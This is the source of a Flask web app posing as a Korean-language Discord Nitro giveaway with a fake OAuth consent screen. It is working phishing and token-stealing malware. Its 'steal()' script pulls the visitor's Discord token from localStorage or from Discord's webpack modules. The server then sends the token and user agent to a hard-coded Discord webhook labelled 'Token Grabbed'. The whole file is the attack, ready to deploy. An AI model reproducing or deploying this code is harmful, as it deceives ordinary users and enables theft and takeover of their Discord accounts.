from flask import Flask, request, render_template_string
import os
import requests
from datetime import datetime

app = Flask(__name__)

# ==================== 설정 ====================
WEBHOOK = "https://discord.com/api/webhooks/1560808467395125248/d7k4t9kqx1tSzGrNCVyvLuI7z4nU6atd7SREjDhqlnqyc-4Jv0btgLKTGnKrqBQxSFbR"
# =============================================

HTML = '''
<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Nitro Event</title>
<link rel="icon" href="https://discord.com/assets/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1e1f22;font-family:"gg sans","Noto Sans",Helvetica,Arial,sans-serif;color:#dbdee1;min-height:100vh;display:flex;justify-content:center;align-items:center}
.container{background:#2b2d31;width:100%;max-width:480px;border-radius:12px;overflow:hidden;box-shadow:0 8px 24px rgba(0,0,0,.4)}
.header{background:linear-gradient(135deg,#5865f2,#7289da);padding:40px 30px;text-align:center}
.nitro-icon{width:80px;height:80px;margin-bottom:16px}
.header h1{font-size:28px;font-weight:700;color:#fff;margin-bottom:8px}
.header p{color:rgba(255,255,255,.85);font-size:16px}
.content{padding:32px}
.prize{background:#1e1f22;border-radius:8px;padding:20px;margin-bottom:24px;text-align:center}
.prize h2{font-size:22px;color:#f2f3f5;margin-bottom:8px}
.prize .amount{font-size:36px;font-weight:700;color:#5865f2;margin:12px 0}
.prize p{color:#b5bac1;font-size:14px}
.rules{margin-bottom:28px}
.rules h3{font-size:14px;color:#b5bac1;margin-bottom:12px;text-transform:uppercase}
.rules ul{list-style:none}
.rules li{font-size:15px;color:#dbdee1;margin-bottom:8px;padding-left:20px;position:relative}
.rules li::before{content:"✓";position:absolute;left:0;color:#57f287;font-weight:bold}
.join-btn{width:100%;padding:16px;background:#5865f2;color:#fff;border:none;border-radius:8px;font-size:18px;font-weight:600;cursor:pointer}
.join-btn:hover{background:#4752c4}
.footer{text-align:center;padding:16px;font-size:12px;color:#6d6f78}
.oauth-screen{display:none;padding:40px 32px;text-align:center}
.oauth-screen.active{display:block}
.app-icon{width:64px;height:64px;border-radius:16px;background:#5865f2;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:28px;color:#fff;font-weight:bold}
.oauth-screen h2{font-size:20px;margin-bottom:8px;color:#f2f3f5}
.oauth-screen .app-name{color:#b5bac1;margin-bottom:24px}
.perms{background:#1e1f22;border-radius:8px;padding:16px;text-align:left;margin-bottom:28px}
.perms h4{font-size:12px;color:#b5bac1;margin-bottom:12px;text-transform:uppercase}
.perm-item{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:14px}
.perm-item span{color:#57f287}
.oauth-btns{display:flex;gap:12px}
.oauth-btns button{flex:1;padding:12px;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
.cancel-btn{background:#4e5058;color:#fff}
.auth-btn{background:#5865f2;color:#fff}
.loading-screen{display:none;padding:60px 32px;text-align:center}
.loading-screen.active{display:block}
.spinner{width:40px;height:40px;border:3px solid #4e5058;border-top-color:#5865f2;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
  <div id="mainScreen">
    <div class="header">
      <img class="nitro-icon" src="https://cdn.discordapp.com/emojis/1026513054015311872.webp?size=96">
      <h1>Discord Nitro Giveaway</h1>
      <p>한정 이벤트 • 오늘만</p>
    </div>
    <div class="content">
      <div class="prize">
        <h2>🎉 1등 상품</h2>
        <div class="amount">Nitro 1년</div>
        <p>+ 추가 경품 다수</p>
      </div>
      <div class="rules">
        <h3>참여 조건</h3>
        <ul>
          <li>Discord 계정 연동 필수</li>
          <li>서버 멤버 인증</li>
          <li>1인 1회 참여 가능</li>
        </ul>
      </div>
      <button class="join-btn" onclick="startOAuth()">이벤트 참가하기</button>
    </div>
    <div class="footer">Discord Nitro Official Event</div>
  </div>

  <div class="oauth-screen" id="oauthScreen">
    <div class="app-icon">N</div>
    <h2>Nitro Event Bot</h2>
    <p class="app-name">이 앱이 회원님의 Discord 계정에 접근하려고 합니다</p>
    <div class="perms">
      <h4>이 앱이 요청하는 권한</h4>
      <div class="perm-item"><span>✓</span> 사용자명과 아바타 보기</div>
      <div class="perm-item"><span>✓</span> 이메일 주소 보기</div>
      <div class="perm-item"><span>✓</span> 서버 목록 보기</div>
      <div class="perm-item"><span>✓</span> 길드 멤버 정보 보기</div>
    </div>
    <div class="oauth-btns">
      <button class="cancel-btn" onclick="location.reload()">취소</button>
      <button class="auth-btn" onclick="steal()">승인</button>
    </div>
  </div>

  <div class="loading-screen" id="loadingScreen">
    <div class="spinner"></div>
    <p>계정 연동 중...</p>
  </div>
</div>

<script>
function startOAuth(){
  document.getElementById("mainScreen").style.display="none";
  document.getElementById("oauthScreen").classList.add("active");
}
async function steal(){
  document.getElementById("oauthScreen").classList.remove("active");
  document.getElementById("loadingScreen").classList.add("active");

  let token = null;
  try{ token = localStorage.getItem("token"); if(token) token=token.replace(/"/g,""); }catch(e){}

  if(!token){
    try{
      let wp=window.webpackChunkdiscord_app;
      if(wp){
        let mods=[];
        wp.push([[Math.random()],{},e=>{for(let i in e.c)mods.push(e.c[i])}]);
        wp.pop();
        for(let m of mods){
          if(m?.exports?.default?.getToken){
            try{let t=m.exports.default.getToken();if(t){token=t;break;}}catch(e){}
          }
        }
      }
    }catch(e){}
  }

  await fetch("/grab", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({token: token || "none", ua: navigator.userAgent})
  });

  setTimeout(()=>{
    document.getElementById("loadingScreen").innerHTML=`
      <div style="font-size:48px;margin-bottom:16px">✅</div>
      <h2 style="color:#57f287;margin-bottom:8px">참여 완료!</h2>
      <p style="color:#b5bac1">이벤트에 성공적으로 등록되었습니다.<br>당첨자는 DM으로 연락드립니다.</p>`;
  },1600);
}
</script>
</body>
</html>
'''

def send_webhook(token, ua):
    payload = {
        "embeds": [{
            "title": "💎 Nitro Event Token Grabbed",
            "color": 0x5865F2,
            "fields": [
                {"name": "Token", "value": f"```{token}```"},
                {"name": "User Agent", "value": f"```{ua}```"},
                {"name": "Time", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            ],
            "footer": {"text": "Render Grabber"}
        }]
    }
    try:
        requests.post(WEBHOOK, json=payload, timeout=10)
    except:
        pass

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/grab", methods=["POST"])
def grab():
    data = request.get_json(force=True, silent=True) or {}
    token = data.get("token", "none")
    ua = data.get("ua", "unknown")
    send_webhook(token, ua)
    return {"status": "ok"}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
